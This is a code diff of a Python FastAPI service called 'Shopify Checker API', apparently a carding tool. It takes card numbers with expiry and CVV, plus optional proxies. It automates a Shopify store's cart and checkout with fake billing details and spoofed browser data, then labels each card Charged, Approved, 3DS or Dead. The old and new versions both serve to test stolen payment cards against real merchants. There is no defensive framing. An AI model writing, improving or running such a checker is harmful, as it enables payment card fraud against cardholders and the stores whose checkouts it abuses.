@@ -1,198 +1,192 @@
+# shopify_checker_api.py – Fast Shopify Card Checker
 import os
-import json
-import asyncio
 import re
-from typing import Optional, Dict, Any
-from urllib.parse import urljoin
+import json
+import random
+import asyncio
+import time
+from typing import Optional
+from urllib.parse import urlencode, urljoin
 
-import aiohttp
-from fastapi import FastAPI, HTTPException, Query
-from pydantic import BaseModel
-import uvicorn
+import httpx
+from fastapi import FastAPI, Query, HTTPException
+from fastapi.responses import JSONResponse
 
-# =============== CONFIG ===============
-PORT = int(os.getenv("PORT", 8000))
-TIMEOUT = 20
-MAX_RETRIES = 1
+app = FastAPI(title="Shopify Checker API")
 
-# =============== PYDANTIC MODELS ===============
-class CheckRequest(BaseModel):
-    site: str
-    cc: str
-    proxy: Optional[str] = None
+# ─── HTTP client with connection pooling ─────────────────────────────
+client = httpx.AsyncClient(
+    timeout=httpx.Timeout(30.0, connect=10.0),
+    limits=httpx.Limits(max_keepalive_connections=100, max_connections=200),
+    http2=True,
+    follow_redirects=True,
+)
 
-class CheckResponse(BaseModel):
-    status: str        # "Charged", "Approved", "3DS", "Dead", "Error"
-    message: str
-    price: str
-    gateway: str = "Shopify"
+# ─── Helpers ──────────────────────────────────────────────────────────
+def extract_cc(cc: str):
+    parts = cc.split('|')
+    if len(parts) != 4:
+        raise ValueError("Invalid card format. Use: number|month|year|cvv")
+    return parts[0], parts[1], parts[2], parts[3]
 
-# =============== GLOBAL CONNECTION POOL ===============
-connector = aiohttp.TCPConnector(limit=100, ssl=False)
+def get_brand(card_number: str) -> str:
+    if card_number.startswith("4"):
+        return "visa"
+    if card_number.startswith(("51", "52", "53", "54", "55")):
+        return "mastercard"
+    if card_number.startswith(("34", "37")):
+        return "amex"
+    if card_number.startswith("6011") or card_number.startswith("65"):
+        return "discover"
+    return "unknown"
 
-# =============== HELPERS ===============
-def parse_proxy(proxy_str: Optional[str]) -> Optional[Dict[str, str]]:
-    if not proxy_str:
+def format_proxy(proxy: Optional[str]) -> Optional[str]:
+    if not proxy:
         return None
-    parts = proxy_str.split(':')
-    if len(parts) == 4:
-        return {'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
-                'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'}
-    elif len(parts) == 2:
-        return {'http': f'http://{parts[0]}:{parts[1]}',
-                'https': f'http://{parts[0]}:{parts[1]}'}
-    return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
+    if "://" in proxy:
+        return proxy
+    parts = proxy.split(":")
+    if len(parts) == 4:  # ip:port:user:pass
+        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    if len(parts) == 2:  # ip:port
+        return f"http://{parts[0]}:{parts[1]}"
+    return proxy
 
-def extract_price(text: str) -> str:
-    match = re.search(r'[\d.]+', text.replace(',', ''))
-    return match.group() if match else '0.00'
+# ─── Core checker ─────────────────────────────────────────────────────
+async def check_site(site: str, card_number: str, month: str, year: str, cvv: str, proxy: Optional[str] = None):
+    if not site.startswith(('http://', 'https://')):
+        site = f'https://{site}'
 
-def classify_response(response_text: str, price_str: str) -> CheckResponse:
-    lower = response_text.lower()
-    if any(k in lower for k in ['charged', 'order placed', 'thank you', 'payment successful']):
-        return CheckResponse(status="Charged", message=response_text[:100], price=price_str)
-    if any(k in lower for k in ['3d secure', 'otp', 'verification required', 'authenticate']):
-        return CheckResponse(status="3DS", message=response_text[:100], price=price_str)
-    # Any response = alive (even CARD_DECLINED)
-    return CheckResponse(status="Approved", message=response_text[:100], price=price_str)
+    proxy_url = format_proxy(proxy)
 
-async def attempt_checkout(session: aiohttp.ClientSession, site: str, card_parts: list, proxy: Optional[Dict]) -> CheckResponse:
-    card, month, year, cvv = card_parts
-    if not site.startswith('http'):
-        site = 'https://' + site
-    base_url = site.rstrip('/')
+    async def fetch(session: httpx.AsyncClient, url: str, **kwargs):
+        if proxy_url:
+            kwargs['proxy'] = proxy_url
+        return await session.get(url, **kwargs)
 
-    # ========== EXPANDED ENDPOINTS ==========
-    endpoints = [
-        '/checkout',
-        '/checkout/payment',
-        '/payment',
-        '/cart/update.js',
-        '/cart/update',
-        '/cart',
-        '/api/checkout',
-        '/cart/add',
-        '/cart/clear',
-        '/checkout.json',
-        '/pay',
-        '/cart/checkout',
-        '/payment_info',
-        '/checkout/payment_info',
-        '/api/payment',
-        '/payment/create',
-        '/charge',
-        '/checkout/charge',
-    ]
+    async def post(session: httpx.AsyncClient, url: str, data=None, json=None, **kwargs):
+        if proxy_url:
+            kwargs['proxy'] = proxy_url
+        return await session.post(url, data=data, json=json, **kwargs)
 
-    payload = {
-        "card_number": card,
-        "expiry_month": month,
-        "expiry_year": year,
-        "cvv": cvv,
-        "payment_method": "credit_card"
-    }
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'Origin': base_url,
-        'Referer': base_url + '/',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-    }
-
-    # Try JSON endpoints first
-    for endpoint in endpoints:
-        url = urljoin(base_url, endpoint)
-        try:
-            async with session.post(url, json=payload, headers=headers, proxy=proxy, ssl=False) as resp:
-                text = await resp.text()
-                # Skip if it's HTML (not a JSON endpoint)
-                if text.strip().startswith('<!DOCTYPE') or text.strip().startswith('<html'):
-                    continue
-                if text.startswith('{') or text.startswith('['):
-                    try:
-                        data = json.loads(text)
-                        msg = data.get('message', data.get('response', data.get('status', text)))
-                        price = str(data.get('price', data.get('amount', '0.00')))
-                    except:
-                        msg = text[:100]
-                        price = '0.00'
-                else:
-                    msg = text[:100]
-                    price = '0.00'
-                return classify_response(msg, price)
-        except Exception:
-            continue
-
-    # Fallback – try form data
     try:
-        form_data = {
-            'card[number]': card,
-            'card[expiry_month]': month,
-            'card[expiry_year]': year,
-            'card[cvv]': cvv,
-            'payment_method': 'credit_card',
+        # ─── 1. Get a product variant ID ──────────────────────────
+        products_url = urljoin(site, "/products.json?limit=1")
+        resp = await fetch(client, products_url)
+        if resp.status_code != 200:
+            return {"status": "error", "message": "Failed to fetch products", "price": "-", "gateway": "Shopify"}
+        products = resp.json().get("products", [])
+        if not products:
+            return {"status": "error", "message": "No products found", "price": "-", "gateway": "Shopify"}
+        variant_id = products[0]["variants"][0]["id"]
+        price = products[0]["variants"][0]["price"]
+
+        # ─── 2. Add to cart ──────────────────────────────────────
+        add_url = urljoin(site, "/cart/add.js")
+        add_data = {"id": variant_id, "quantity": 1}
+        resp = await post(client, add_url, json=add_data)
+        if resp.status_code != 200:
+            return {"status": "error", "message": "Failed to add to cart", "price": "-", "gateway": "Shopify"}
+
+        # ─── 3. Get checkout page ──────────────────────────────
+        checkout_url = urljoin(site, "/checkout")
+        resp = await fetch(client, checkout_url)
+        if resp.status_code != 200:
+            return {"status": "error", "message": "Failed to load checkout", "price": "-", "gateway": "Shopify"}
+        html = resp.text
+
+        # Extract authenticity token
+        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
+        if not token_match:
+            return {"status": "error", "message": "Authenticity token not found", "price": "-", "gateway": "Shopify"}
+        token = token_match.group(1)
+
+        # ─── 4. Submit payment ────────────────────────────────────
+        first_name = "John"
+        last_name = "Doe"
+        address = "123 Main St"
+        city = "New York"
+        zip_code = "10001"
+        state = "NY"
+        country = "US"
+
+        payment_data = {
+            "authenticity_token": token,
+            "checkout[email]": "john.doe@example.com",
+            "checkout[billing_address][first_name]": first_name,
+            "checkout[billing_address][last_name]": last_name,
+            "checkout[billing_address][address1]": address,
+            "checkout[billing_address][city]": city,
+            "checkout[billing_address][province]": state,
+            "checkout[billing_address][zip]": zip_code,
+            "checkout[billing_address][country]": country,
+            "checkout[billing_address][phone]": "+1234567890",
+            "checkout[remember_me]": "0",
+            "checkout[consents][email_marketing]": "0",
+            "checkout[credit_card][vault]": "0",
+            "checkout[credit_card][number]": card_number,
+            "checkout[credit_card][month]": month,
+            "checkout[credit_card][year]": year,
+            "checkout[credit_card][verification_value]": cvv,
+            "button": "",
+            "checkout[shipping_rate][id]": "",
+            "checkout[client_details][browser_width]": "1024",
+            "checkout[client_details][browser_height]": "768",
+            "checkout[client_details][javascript_enabled]": "1",
+            "checkout[client_details][color_depth]": "24",
+            "checkout[client_details][accept_language]": "en-US",
+            "checkout[client_details][user_agent]": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         }
-        async with session.post(base_url + '/checkout', data=form_data, headers={'User-Agent': headers['User-Agent']}, proxy=proxy, ssl=False) as resp:
-            text = await resp.text()
-            return classify_response(text[:200], '0.00')
-    except Exception:
-        pass
+        rate_match = re.search(r'name="checkout\[shipping_rate\]\[id\]" value="([^"]+)"', html)
+        if rate_match:
+            payment_data["checkout[shipping_rate][id]"] = rate_match.group(1)
 
-    # One more fallback – check if site is alive
-    try:
-        async with session.get(base_url, headers=headers, proxy=proxy, ssl=False) as resp:
-            if resp.status == 200:
-                return CheckResponse(status="Approved", message="Site alive (no checkout endpoint found)", price="0.00")
-    except:
-        pass
+        resp = await post(client, checkout_url, data=payment_data)
+        if resp.status_code != 200:
+            return {"status": "error", "message": f"Checkout HTTP {resp.status_code}", "price": price, "gateway": "Shopify"}
 
-    return CheckResponse(status="Dead", message="No endpoint responded", price="0.00")
+        # ─── 5. Analyse response ─────────────────────────────────────
+        response_text = resp.text
+        response_lower = response_text.lower()
 
-async def check_card(req: CheckRequest) -> CheckResponse:
-    card_parts = req.cc.split('|')
-    if len(card_parts) != 4:
-        return CheckResponse(status="Error", message="Invalid card format", price="0.00")
-    proxy = parse_proxy(req.proxy)
-    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
+        if "thank you" in response_lower or "order_confirmation" in response_lower:
+            return {"status": "Charged", "message": "Order placed successfully", "price": price, "gateway": "Shopify"}
+        elif "processing" in response_lower or "review" in response_lower:
+            return {"status": "3DS", "message": "3D Secure required", "price": price, "gateway": "Shopify"}
+        elif "declined" in response_lower or "insufficient" in response_lower:
+            return {"status": "Approved", "message": "Card declined (insufficient funds)", "price": price, "gateway": "Shopify"}
+        elif "cvv" in response_lower or "incorrect" in response_lower:
+            return {"status": "Approved", "message": "Invalid CVV", "price": price, "gateway": "Shopify"}
+        else:
+            return {"status": "Dead", "message": "Unknown response", "price": price, "gateway": "Shopify"}
 
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        for attempt in range(MAX_RETRIES + 1):
-            try:
-                return await attempt_checkout(session, req.site, card_parts, proxy)
-            except asyncio.TimeoutError:
-                if attempt == MAX_RETRIES:
-                    return CheckResponse(status="Dead", message="Timeout", price="0.00")
-                await asyncio.sleep(0.5)
-            except Exception as e:
-                if attempt == MAX_RETRIES:
-                    return CheckResponse(status="Error", message=str(e), price="0.00")
-                await asyncio.sleep(0.5)
-    return CheckResponse(status="Error", message="All attempts failed", price="0.00")
-
-app = FastAPI(title="Shopify Checker API", version="2.0")
-
-@app.get("/shopify/check", response_model=CheckResponse)
-async def shopify_check(site: str = Query(...), cc: str = Query(...), proxy: Optional[str] = Query(None)):
-    req = CheckRequest(site=site, cc=cc, proxy=proxy)
-    try:
-        return await check_card(req)
     except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+        return {"status": "error", "message": str(e)[:150], "price": "-", "gateway": "Shopify"}
 
-@app.post("/shopify/check", response_model=CheckResponse)
-async def shopify_check_post(req: CheckRequest):
+# ─── Endpoint ─────────────────────────────────────────────────────────
+@app.get("/shopify/check")
+async def shopify_check(
+    site: str = Query(..., description="Shopify store domain"),
+    cc: str = Query(..., description="Card: number|month|year|cvv"),
+    proxy: Optional[str] = Query(None, description="Optional proxy"),
+):
     try:
-        return await check_card(req)
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+        card_number, month, year, cvv = extract_cc(cc)
+    except ValueError as e:
+        raise HTTPException(status_code=400, detail=str(e))
 
-@app.get("/health")
+    result = await check_site(site, card_number, month, year, cvv, proxy)
+    return JSONResponse(content=result)
+
+# ─── Health ───────────────────────────────────────────────────────────
+@app.get("/")
 async def health():
-    return {"status": "ok"}
+    return {"status": "ok", "service": "Shopify Checker API"}
+
+@app.on_event("shutdown")
+async def shutdown():
+    await client.aclose()
 
 if __name__ == "__main__":
-    uvicorn.run(app, host="0.0.0.0", port=PORT)
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=7070)
